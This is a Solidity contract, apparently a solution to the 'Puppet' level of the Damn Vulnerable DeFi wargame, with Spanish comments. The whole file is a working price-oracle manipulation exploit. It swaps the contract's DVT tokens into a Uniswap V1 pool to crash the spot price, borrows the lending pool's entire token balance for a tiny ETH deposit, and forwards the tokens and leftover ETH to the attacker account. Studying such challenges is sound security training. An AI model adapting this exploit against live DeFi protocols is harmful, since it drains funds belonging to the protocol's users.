// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IPuppetPool {
  function calculateDepositRequired(uint256 amount) external view returns (uint256);
  function borrow(uint256 borrowAmount) external payable;
}

//Interfaz de Uniswap tomada a partir de UniswapV1Exchange.json
interface IUniswapExchange { 
  function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract PuppetAttacker {

  DamnValuableToken public token;
  IUniswapExchange public uniswapExchange;
  IPuppetPool public puppetPool;

  constructor(DamnValuableToken _token, IUniswapExchange _uniswapExchange, IPuppetPool _puppetPool) {
    token = _token;
    uniswapExchange = _uniswapExchange;
    puppetPool = _puppetPool;
  }

  function attack() public {

    // Manipulamos el balance en uniswapExchange para que el método de puppetPool "_computeOraclePrice" rompa con la lógica de "1 DVT = 2 ETH".
    token.approve(address(uniswapExchange), token.balanceOf(address(this)));
    uniswapExchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, 9999999999);

    //Calculamos el depósito necesario en ETH
    uint256 depositoNecesario = puppetPool.calculateDepositRequired(token.balanceOf(address(puppetPool)));
    console.log(depositoNecesario);

    // Realizamos el borrow al contrato puppet para pedir prestado por siempre todos sus DVT :)
    puppetPool.borrow{value:depositoNecesario}(token.balanceOf(address(puppetPool)));

    //Transferimos todos los DVT obtenidos a la EOA attacker.
    token.transfer(msg.sender,token.balanceOf(address(this)));

    //Transferimos el ETH que sobró a la EOA attacker.
    payable(msg.sender).transfer(address(this).balance);
  }

    //Para poder recibir los ETH y atacar
    receive() external payable {}
}